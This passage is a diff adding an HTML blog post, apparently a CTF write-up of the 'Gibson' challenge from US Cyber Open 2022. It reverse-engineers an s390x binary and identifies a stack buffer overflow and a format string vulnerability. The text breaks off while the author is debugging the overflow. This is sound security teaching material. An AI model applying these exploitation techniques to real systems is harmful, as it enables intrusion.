@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="en">
+    <head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+<link rel="alternate" type="application/rss+xml" title="RSS Feed for Ethan Ho" href="/index.xml" />
+
+<meta name="generator" content="Hugo 0.92.2" />
+
+<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bitter&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+<link href="https://eth007.me/blog/css/styles.css" rel="stylesheet">
+
+<title>Ethan Ho</title>
+
+
+
+<meta name="description" content="Can you really call it a &ldquo;main&quot;frame if I haven&rsquo;t used it before now? Author: Research Innovations, Inc. (RII)
+ gibson_s390x.tar   Gibson was a binary exploitation challenge in the US Cyber Open CTF in 2022, which is the first step toward qualification for the US Cyber Team. At the end of the CTF, it was worth 1000 points and had 10 solves. I was the fourth solve on this challenge (could have been second if CTFd wasn&rsquo;t glitching[1]😔).">
+<meta name="author" content="">
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="US Cyber Open 2022 - Gibson" />
+<meta property="og:description" content="Can you really call it a &ldquo;main&quot;frame if I haven&rsquo;t used it before now? Author: Research Innovations, Inc. (RII)
+ gibson_s390x.tar   Gibson was a binary exploitation challenge in the US Cyber Open CTF in 2022, which is the first step toward qualification for the US Cyber Team. At the end of the CTF, it was worth 1000 points and had 10 solves. I was the fourth solve on this challenge (could have been second if CTFd wasn&rsquo;t glitching[1]😔)." />
+<meta property="og:url" content="https://eth007.me/blog/ctf/gibson/" />
+<meta property="og:image" content="https://eth007.me/blog/static/open-graph.png">
+<meta property="og:author" content="">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="https://eth007.me/blog/">
+<meta property="twitter:url" content="https://eth007.me/blog/ctf/gibson/">
+<meta name="twitter:title" content="US Cyber Open 2022 - Gibson">
+<meta name="twitter:description" content="Can you really call it a &ldquo;main&quot;frame if I haven&rsquo;t used it before now? Author: Research Innovations, Inc. (RII)
+ gibson_s390x.tar   Gibson was a binary exploitation challenge in the US Cyber Open CTF in 2022, which is the first step toward qualification for the US Cyber Team. At the end of the CTF, it was worth 1000 points and had 10 solves. I was the fourth solve on this challenge (could have been second if CTFd wasn&rsquo;t glitching[1]😔).">
+<meta name="twitter:image" content="https://eth007.me/blog/static/open-graph.png">
+
+<link rel="icon" type="image/x-icon" href="https://eth007.me/blog/static/favicon.ico">
+</head>
+    <body>
+        <div class="content">
+            <nav class="blog-navigation">
+
+  <div class="left">
+    
+      <div class="blog-logo">
+        
+        
+
+        <a href='/blog/' title="Ethan Ho">
+          <img src="https://eth007.me/blog/img/logo.png" alt="Ethan Ho">
+        </a>
+
+      </div>
+    
+      <div class="blog-info">
+          <div class="blog-title">
+            <a href='/blog/' title="Ethan Ho">
+              <h1>Ethan Ho</h1>
+            </a>
+          </div>
+    
+          <div class="blog-description">
+            <a href='/blog/' title="Ethan Ho">
+              <h2></h2>
+            </a>
+          </div>
+      </div>
+
+  </div>
+
+  <div class="right">
+
+    <div class="blog-links">
+
+      <ul class="links">
+
+        
+
+          <li class="item page"><a href='/blog/about' title="about">about</a></li><li class="item page"><a href='/blog/cypat' title="projects">projects</a></li><li class="item page"><a href='https://github.com/Eth007' title="github">github</a></li>
+
+        
+        
+        
+
+      </ul>
+
+    </div>
+
+  </div>
+
+
+</nav>
+            
+
+<div class="single">
+
+    <article>
+
+        <div class="article-meta">
+        
+    <ul class="article-info">
+        <li class="time" style="">
+            <time class="time">14 Sep 2022</time>
+        </li>
+        <li class="reading-time" style="">
+            <span class="material-icons">timer</span>13 min read
+        </li>
+        <li class="words-count" style="">
+            <span class="material-icons">article</span>2583 words
+        </li>
+    </ul>
+
+    <ul class="article-tags" style="">
+
+        
+            
+                <li>
+                    <a href='/blog/tags/pwn'>#pwn</a>
+                </li>
+            
+                <li>
+                    <a href='/blog/tags/ctf'>#ctf</a>
+                </li>
+            
+             
+
+    </ul>
+
+</div>
+                      
+        <div class="article-header">
+            <h1 class="article-title">US Cyber Open 2022 - Gibson</h1>          
+            <h2 class="article-excerpt">Stack overflow to RCE on s390x</h2>  
+        </div>
+
+        <div class="article-content">
+            <blockquote>
+<p>Can you really call it a &ldquo;main&quot;frame if I haven&rsquo;t used it before now?
+Author:  <a href="https://www.researchinnovations.com/">Research Innovations, Inc. (RII)</a></p>
+<ul>
+<li><a href="https://github.com/tj-oconnor/cyber-open-2022/blob/main/pwn/gibson/files/gibson_s390x.tar">gibson_s390x.tar</a></li>
+</ul>
+</blockquote>
+<p>Gibson was a binary exploitation challenge in the US Cyber Open CTF in 2022, which is the first step toward qualification for the US Cyber Team. At the end of the CTF, it was worth 1000 points and had 10 solves. I was the fourth solve on this challenge (could have been second if CTFd wasn&rsquo;t glitching<!-- raw HTML omitted --><a href="#f1">[1]</a><!-- raw HTML omitted --> 😔).</p>
+<p>Anyways, let&rsquo;s get to the challenge!</p>
+<p>We are given a tarball that contains a docker setup (for both debug and testing), and the binaries for the challenge (which were a program called <code>mainframe</code> and the <code>libc.so.6</code> file that it dynamically loads).</p>
+<h2 id="initial-investigation---what-even-is-this">Initial Investigation - What even is this?</h2>
+<p>Running <code>file</code> and <code>checksec</code> on the binary, we find that it is compiled for the s390x architecture. I&rsquo;d never heard of this architecture before, but looking it up, it looks like it was designed by IBM, and was discontinued in 1998. 💀</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ file mainframe
+mainframe: ELF 64-bit MSB executable, IBM S/390, version 1 (SYSV), dynamically linked, interpreter /lib/ld64.so.1, BuildID[sha1]=5684ff421a651508bbe92190636290180d7e03c2, for GNU/Linux 3.2.0, not stripped
+$ checksec mainframe
+[!] Could not populate PLT: AttributeError: arch must be one of [&#39;aarch64&#39;, &#39;alpha&#39;, &#39;amd64&#39;, &#39;arm&#39;, &#39;avr&#39;, &#39;cris&#39;, &#39;i386&#39;, &#39;ia64&#39;, &#39;m68k&#39;, &#39;mips&#39;, &#39;mips64&#39;, &#39;msp430&#39;, &#39;none&#39;, &#39;powerpc&#39;, &#39;powerpc64&#39;, &#39;riscv&#39;, &#39;s390&#39;, &#39;sparc&#39;, &#39;sparc64&#39;, &#39;thumb&#39;, &#39;vax&#39;]
+[*] &#39;/home/ethan/ctf/uscyberopen/pwn/gibson/gibson_s390x/bin/mainframe&#39;
+    Arch:     em_s390-64-big
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x1000000)
+</code></pre></div><p>This gives us some information about the binary. Seems that s390x is a big-endian architecture (yikes!), and that the binary is compiled with no PIE and no canary.</p>
+<h2 id="setting-up-the-environment---thanks-for-the-help">Setting up the environment - Thanks for the help!</h2>
+<p>Thankfully, the challenge author has left a <code>tips.md</code> file for us to read, to guide us in setting up a debug/test environment. Not only that, but a <code>docker-compose.yml</code> file has been left for us to do all the necessary configuration for the challenge environment. Other people did run into some problems with the debug environment not working, but this could be solved by updating to the latest version of Docker and docker-compose.</p>
+<p>Running <code>docker-compose up --build -d</code>, we start the containers—one for debug and one for testing. As we can see from the <code>tips.md</code> file, we can connect to <code>localhost:8888</code> to access the debug challenge, <code>localhost:1234</code> to access the qemu gdbserver, and <code>localhost:9999</code> to access a testing environment for the challenge that should be identical to the one that the organizers have.</p>
+<p>Now that we have a debug environment, we can start with the actual challenge!</p>
+<h2 id="reverse-engineering---time-to-guess-what-opcodes-do">Reverse engineering - Time to guess what opcodes do!</h2>
+<p>I looked online for any decompilers for s390x, but it seems that there was nothing. So, I installed <code>s390x-linux-gnu-objdump</code> with <code>apt-get install binutils-s390x-linux-gnu</code>, and started reading through the assembly code. The important part of the disassembly is the <code>main</code> function:</p>
+<blockquote>
+<p>Sidenote: Sadly, <code>s390x-linux-gnu-objdump</code> does not seem to support Intel syntax, so we&rsquo;ll have to bear with what we have right now.😢</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#f00">0000000001000830</span> <span style="color:#f00">&lt;</span>main<span style="color:#f00">&gt;</span>:
+ <span style="color:#f00">1000830:</span>       eb bf f0 <span style="color:#ff0;font-weight:bold">58</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">24</span>       stmg    %r11,%r15,<span style="color:#ff0;font-weight:bold">88</span>(%r15)
+ <span style="color:#f00">1000836:</span>       e3 f0 fb <span style="color:#ff0;font-weight:bold">58</span> ff <span style="color:#ff0;font-weight:bold">71</span>       lay     %r15,-<span style="color:#ff0;font-weight:bold">1192</span>(%r15)
+ <span style="color:#f00">100083</span>c:       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> bf             lgr     %r11,%r15
+ <span style="color:#f00">1000840:</span>       c4 <span style="color:#ff0;font-weight:bold">18</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">0</span>b d8       lgrl    %r1,<span style="color:#ff0;font-weight:bold">1001ff0</span> &lt;stdin@GLIBC_2.2&gt;
+ <span style="color:#f00">1000846:</span>       e3 <span style="color:#ff0;font-weight:bold">10</span> <span style="color:#ff0;font-weight:bold">10</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">04</span>       lg      %r1,<span style="color:#ff0;font-weight:bold">0</span>(%r1)
+ <span style="color:#f00">100084</span>c:       a7 <span style="color:#ff0;font-weight:bold">59</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r5,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">1000850:</span>       a7 <span style="color:#ff0;font-weight:bold">49</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">02</span>             lghi    %r4,<span style="color:#ff0;font-weight:bold">2</span>
+ <span style="color:#f00">1000854:</span>       a7 <span style="color:#ff0;font-weight:bold">39</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r3,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">1000858:</span>       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">21</span>             lgr     %r2,%r1
+ <span style="color:#f00">100085</span>c:       c0 e5 ff ff ff <span style="color:#ff0;font-weight:bold">1</span>c       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000694</span> &lt;setvbuf@plt&gt;
+ <span style="color:#f00">1000862:</span>       c4 <span style="color:#ff0;font-weight:bold">18</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">0</span>b cb       lgrl    %r1,<span style="color:#ff0;font-weight:bold">1001ff8</span> &lt;stdout@GLIBC_2.2&gt;
+ <span style="color:#f00">1000868:</span>       e3 <span style="color:#ff0;font-weight:bold">10</span> <span style="color:#ff0;font-weight:bold">10</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">04</span>       lg      %r1,<span style="color:#ff0;font-weight:bold">0</span>(%r1)
+ <span style="color:#f00">100086</span>e:       a7 <span style="color:#ff0;font-weight:bold">59</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r5,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">1000872:</span>       a7 <span style="color:#ff0;font-weight:bold">49</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">02</span>             lghi    %r4,<span style="color:#ff0;font-weight:bold">2</span>
+ <span style="color:#f00">1000876:</span>       a7 <span style="color:#ff0;font-weight:bold">39</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r3,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">100087</span>a:       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">21</span>             lgr     %r2,%r1
+ <span style="color:#f00">100087</span>e:       c0 e5 ff ff ff <span style="color:#ff0;font-weight:bold">0</span>b       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000694</span> &lt;setvbuf@plt&gt;
+ <span style="color:#f00">1000884:</span>       ec <span style="color:#ff0;font-weight:bold">1</span>b <span style="color:#ff0;font-weight:bold">00</span> a0 <span style="color:#ff0;font-weight:bold">00</span> d9       aghik   %r1,%r11,<span style="color:#ff0;font-weight:bold">160</span>
+ <span style="color:#f00">100088</span>a:       a7 <span style="color:#ff0;font-weight:bold">49</span> <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r4,<span style="color:#ff0;font-weight:bold">1024</span>
+ <span style="color:#f00">100088</span>e:       a7 <span style="color:#ff0;font-weight:bold">39</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r3,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">1000892:</span>       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">21</span>             lgr     %r2,%r1
+ <span style="color:#f00">1000896:</span>       c0 e5 ff ff ff <span style="color:#ff0;font-weight:bold">0</span>f       brasl   %r14,<span style="color:#ff0;font-weight:bold">10006b4</span> &lt;memset@plt&gt;
+ <span style="color:#f00">100089</span>c:       c0 <span style="color:#ff0;font-weight:bold">20</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> d6       larl    %r2,<span style="color:#ff0;font-weight:bold">1000a48</span> &lt;_IO_stdin_used+<span style="color:#ff0;font-weight:bold">0x4</span>&gt;
+ <span style="color:#f00">10008</span>a2:       c0 e5 ff ff fe d9       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000654</span> &lt;puts@plt&gt;
+ <span style="color:#f00">10008</span>a8:       c0 <span style="color:#ff0;font-weight:bold">20</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> d7       larl    %r2,<span style="color:#ff0;font-weight:bold">1000a56</span> &lt;_IO_stdin_used+<span style="color:#ff0;font-weight:bold">0x12</span>&gt;
+ <span style="color:#f00">10008</span>ae:       c0 e5 ff ff fe d3       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000654</span> &lt;puts@plt&gt;
+ <span style="color:#f00">10008</span>b4:       ec <span style="color:#ff0;font-weight:bold">1</span>b <span style="color:#ff0;font-weight:bold">00</span> a0 <span style="color:#ff0;font-weight:bold">00</span> d9       aghik   %r1,%r11,<span style="color:#ff0;font-weight:bold">160</span>
+ <span style="color:#f00">10008</span>ba:       a7 <span style="color:#ff0;font-weight:bold">49</span> <span style="color:#ff0;font-weight:bold">07</span> d0             lghi    %r4,<span style="color:#ff0;font-weight:bold">2000</span>
+ <span style="color:#f00">10008</span>be:       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">31</span>             lgr     %r3,%r1
+ <span style="color:#f00">10008</span>c2:       a7 <span style="color:#ff0;font-weight:bold">29</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r2,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">10008</span>c6:       c0 e5 ff ff fe <span style="color:#ff0;font-weight:bold">97</span>       brasl   %r14,<span style="color:#ff0;font-weight:bold">10005f4</span> &lt;read@plt&gt;
+ <span style="color:#f00">10008</span>cc:       c0 <span style="color:#ff0;font-weight:bold">20</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> cf       larl    %r2,<span style="color:#ff0;font-weight:bold">1000a6a</span> &lt;_IO_stdin_used+<span style="color:#ff0;font-weight:bold">0x26</span>&gt;
+ <span style="color:#f00">10008</span>d2:       c0 e5 ff ff fe c1       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000654</span> &lt;puts@plt&gt;
+ <span style="color:#f00">10008</span>d8:       e5 <span style="color:#ff0;font-weight:bold">48</span> b4 a0 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>       mvghi   <span style="color:#ff0;font-weight:bold">1184</span>(%r11),<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">10008</span>de:       a7 f4 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">13</span>             j       <span style="color:#ff0;font-weight:bold">1000904</span> &lt;main+<span style="color:#ff0;font-weight:bold">0xd4</span>&gt;
+ <span style="color:#f00">10008</span>e2:       e3 <span style="color:#ff0;font-weight:bold">10</span> b4 a0 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">04</span>       lg      %r1,<span style="color:#ff0;font-weight:bold">1184</span>(%r11)
+ <span style="color:#f00">10008</span>e8:       <span style="color:#f00">43</span> <span style="color:#f00">11</span> b0 a0             ic      %r1,<span style="color:#ff0;font-weight:bold">160</span>(%r1,%r11)
+ <span style="color:#f00">10008</span>ec:       c0 <span style="color:#ff0;font-weight:bold">17</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">52</span>       xilf    %r1,<span style="color:#ff0;font-weight:bold">82</span>
+ <span style="color:#f00">10008</span>f2:       <span style="color:#f00">18</span> <span style="color:#f00">21</span>                   lr      %r2,%r1
+ <span style="color:#f00">10008</span>f4:       e3 <span style="color:#ff0;font-weight:bold">10</span> b4 a0 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">04</span>       lg      %r1,<span style="color:#ff0;font-weight:bold">1184</span>(%r11)
+ <span style="color:#f00">10008</span>fa:       <span style="color:#f00">42</span> <span style="color:#f00">21</span> b0 a0             stc     %r2,<span style="color:#ff0;font-weight:bold">160</span>(%r1,%r11)
+ <span style="color:#f00">10008</span>fe:       eb <span style="color:#ff0;font-weight:bold">01</span> b4 a0 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">7</span>a       agsi    <span style="color:#ff0;font-weight:bold">1184</span>(%r11),<span style="color:#ff0;font-weight:bold">1</span>
+ <span style="color:#f00">1000904:</span>       e3 <span style="color:#ff0;font-weight:bold">10</span> b4 a0 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">04</span>       lg      %r1,<span style="color:#ff0;font-weight:bold">1184</span>(%r11)
+ <span style="color:#f00">100090</span>a:       c2 <span style="color:#ff0;font-weight:bold">1</span>e <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">03</span> ff       clgfi   %r1,<span style="color:#ff0;font-weight:bold">1023</span>
+ <span style="color:#f00">1000910:</span>       a7 c4 ff e9             jle     <span style="color:#ff0;font-weight:bold">10008e2</span> &lt;main+<span style="color:#ff0;font-weight:bold">0xb2</span>&gt;
+ <span style="color:#f00">1000914:</span>       a7 <span style="color:#ff0;font-weight:bold">29</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r2,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">1000918:</span>       c0 e5 ff ff fe <span style="color:#ff0;font-weight:bold">8</span>e       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000634</span> &lt;sleep@plt&gt;
+ <span style="color:#f00">100091</span>e:       ec <span style="color:#ff0;font-weight:bold">1</span>b <span style="color:#ff0;font-weight:bold">00</span> a0 <span style="color:#ff0;font-weight:bold">00</span> d9       aghik   %r1,%r11,<span style="color:#ff0;font-weight:bold">160</span>
+ <span style="color:#f00">1000924:</span>       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">21</span>             lgr     %r2,%r1
+ <span style="color:#f00">1000928:</span>       c0 e5 ff ff fe <span style="color:#ff0;font-weight:bold">76</span>       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000614</span> &lt;printf@plt&gt;
+ <span style="color:#f00">100092</span>e:       a7 <span style="color:#ff0;font-weight:bold">18</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lhi     %r1,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">1000932:</span>       b9 <span style="color:#ff0;font-weight:bold">14</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">11</span>             lgfr    %r1,%r1
+ <span style="color:#f00">1000936:</span>       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">21</span>             lgr     %r2,%r1
+ <span style="color:#f00">100093</span>a:       eb bf b5 <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">04</span>       lmg     %r11,%r15,<span style="color:#ff0;font-weight:bold">1280</span>(%r11)
+ <span style="color:#f00">1000940:</span>       <span style="color:#f00">07</span> fe                   br      %r14
+ <span style="color:#f00">1000942:</span>       <span style="color:#f00">07</span> <span style="color:#f00">07</span>                   nopr    %r7
+ <span style="color:#f00">1000944:</span>       <span style="color:#f00">07</span> <span style="color:#f00">07</span>                   nopr    %r7
+ <span style="color:#f00">1000946:</span>       <span style="color:#f00">07</span> <span style="color:#f00">07</span>                   nopr    %r7
+</code></pre></div><p>These opcodes are different than the familiar ones, as this is not x86. I found a reference for the opcodes at <a href="https://en.wikibooks.org/wiki/360_Assembly/360_Instruction">https://en.wikibooks.org/wiki/360_Assembly/360_Instruction</a>, but a lot of the opcodes do not have a wiki article added so I had to do a bit of inferring as to what each opcode did.</p>
+<p>While investigating s390x, I also noticed that at the end of each function, we have a <code>br %r14</code> instruction. This instruction means that program execution continues at the address in <code>r14</code> after a function is called. We could say that the return address is stored in the <code>r14</code> register. I also found that <code>r15</code> is being used as the stack pointer.</p>
+<p>After a while, I found two vulnerabilities. First of all, there&rsquo;s a stack buffer overflow at <code>0x10008c6</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"> <span style="color:#f00">10008</span>b4:       ec <span style="color:#ff0;font-weight:bold">1</span>b <span style="color:#ff0;font-weight:bold">00</span> a0 <span style="color:#ff0;font-weight:bold">00</span> d9       aghik   %r1,%r11,<span style="color:#ff0;font-weight:bold">160</span>
+ <span style="color:#f00">10008</span>ba:       a7 <span style="color:#ff0;font-weight:bold">49</span> <span style="color:#ff0;font-weight:bold">07</span> d0             lghi    %r4,<span style="color:#ff0;font-weight:bold">2000</span>
+ <span style="color:#f00">10008</span>be:       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">31</span>             lgr     %r3,%r1
+ <span style="color:#f00">10008</span>c2:       a7 <span style="color:#ff0;font-weight:bold">29</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">00</span>             lghi    %r2,<span style="color:#ff0;font-weight:bold">0</span>
+ <span style="color:#f00">10008</span>c6:       c0 e5 ff ff fe <span style="color:#ff0;font-weight:bold">97</span>       brasl   %r14,<span style="color:#ff0;font-weight:bold">10005f4</span> &lt;read@plt&gt;
+</code></pre></div><p>Here, 2000 bytes are written into a buffer that is 1024 (or something like that) bytes long. We can guess from here that the calling convention for this architecture is that arguments get passed through <code>r2</code>, <code>r3</code>, and then <code>r4</code>. This is because we see here that <code>read(0, &lt;address&gt;, 2000)</code> is being called.</p>
+<p>Another vulnerability that I found was that at <code>0x1000928</code>, user input is passed through <code>r2</code>, making it the first argument to <code>printf</code>. This is a format string vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"> <span style="color:#f00">100091</span>e:       ec <span style="color:#ff0;font-weight:bold">1</span>b <span style="color:#ff0;font-weight:bold">00</span> a0 <span style="color:#ff0;font-weight:bold">00</span> d9       aghik   %r1,%r11,<span style="color:#ff0;font-weight:bold">160</span>
+ <span style="color:#f00">1000924:</span>       b9 <span style="color:#ff0;font-weight:bold">04</span> <span style="color:#ff0;font-weight:bold">00</span> <span style="color:#ff0;font-weight:bold">21</span>             lgr     %r2,%r1
+ <span style="color:#f00">1000928:</span>       c0 e5 ff ff fe <span style="color:#ff0;font-weight:bold">76</span>       brasl   %r14,<span style="color:#ff0;font-weight:bold">1000614</span> &lt;printf@plt&gt;
+</code></pre></div><p>However, after running the program (through connecting to <code>localhost:9999</code>), we can see that the lines of assembly before the call to <code>printf</code> do manipulate our input a little bit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nc localhost 9999
+GIBSON S390X
+Enter payroll data:
+asdfasdfasdfasdf
+Processing data...
+3!643!643!643!64XRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR
+</code></pre></div><p>Through looking at the assembly and experimenting a bit, we can see that our input is XORed with the character <code>R</code> before being passed to <code>printf</code>. This shouldn&rsquo;t be a problem, because we can just XOR our input with <code>R</code> before passing it the program.</p>
+<p>So, let&rsquo;s see what we know at this point:</p>
+<ul>
+<li>The program reads in too much input, leading to a stack buffer overflow</li>
+<li>The program also calls <code>printf()</code> on the input XORed with <code>R</code>, allowing us to leak values (or write to arbitrary addresses with the <code>%n</code> format specifier)</li>
+</ul>
+<h2 id="exploitation---what-do-we-control">Exploitation - What do we control?</h2>
+<p>We do have a stack overflow, but we do not know if the stack in s390x works the same way as in x86. So, we do some experimentation.</p>
+<p>First, we generate a cyclic pattern with <code>cyclic 2000 -n 8</code>. Then we pass it to the program running with GDB at <code>localhost:8888</code>. This can be debugged with the gdbserver running at <code>localhost:1234</code> using gdb-multiarch:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gef➤  set architecture s390:64-bit
+The target architecture is assumed to be s390:64-bit
+gef➤  file bin/mainframe
+Reading symbols from bin/mainframe...
+(No debugging symbols found in bin/mainframe)
+Python Exception &lt;class &#39;ValueError&#39;&gt; 22 is not a valid Abi:
+gef➤  target remote localhost:1234
+</code></pre></div><p>We can then examine the registers in GDB with <code>info reg</code>. Four of the registers look like they have been affected by our input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">r11            0x7061616161616166  0x7061616161616166
